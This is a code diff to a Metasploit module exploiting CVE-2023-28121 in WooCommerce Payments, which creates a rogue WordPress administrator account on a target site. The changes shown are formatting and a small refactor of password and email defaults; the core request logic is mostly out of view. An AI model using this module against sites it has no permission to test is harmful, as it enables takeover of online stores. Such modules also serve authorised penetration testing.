@@ -25,9 +25,9 @@ class MetasploitModule < Msf::Auxiliary
           'Julien Ahrens' # detailed writeup
         ],
         'References' => [
-          [ 'URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],
-          [ 'URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],
-          [ 'CVE', '2023-28121']
+          ['URL', 'https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/'],
+          ['URL', 'https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/'],
+          ['CVE', '2023-28121']
         ],
         'DisclosureDate' => '2023-03-22',
         'Notes' => {
@@ -40,11 +40,11 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('USERNAME', [ true, 'User to create', '']),
-        OptString.new('PASSWORD', [ false, 'Password to create, random if blank', '']),
-        OptString.new('EMAIL', [ false, 'Email to create, random if blank', '']),
-        OptInt.new('ADMINID', [ false, 'ID Number of an administrative user', 1]),
-        OptString.new('TARGETURI', [ true, 'The URI of the Wordpress instance', '/'])
+        OptString.new('USERNAME', [true, 'User to create', '']),
+        OptString.new('PASSWORD', [false, 'Password to create, random if blank', '']),
+        OptString.new('EMAIL', [false, 'Email to create, random if blank', '']),
+        OptInt.new('ADMINID', [false, 'ID Number of an administrative user', 1]),
+        OptString.new('TARGETURI', [true, 'The URI of the Wordpress instance', '/'])
       ]
     )
   end
@@ -63,16 +63,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    password = datastore['PASSWORD']
     if datastore['PASSWORD'].blank?
       password = Rex::Text.rand_text_alphanumeric(10..15)
-    else
-      password = datastore['PASSWORD']
     end
+
+    email = datastore['EMAIL']
     if datastore['EMAIL'].blank?
       email = Rex::Text.rand_mail_address
-    else
-      email = datastore['EMAIL']
     end
+
     print_status("Attempting to create administrator -> #{datastore['USERNAME']}:#{password} (#{email})")
     [nil, 'index.php'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
       res = send_request_cgi({
@@ -112,5 +112,4 @@ class MetasploitModule < Msf::Auxiliary
       break # we didn't get a 404 so we can bail on the 2nd attempt
     end
   end
-
 end
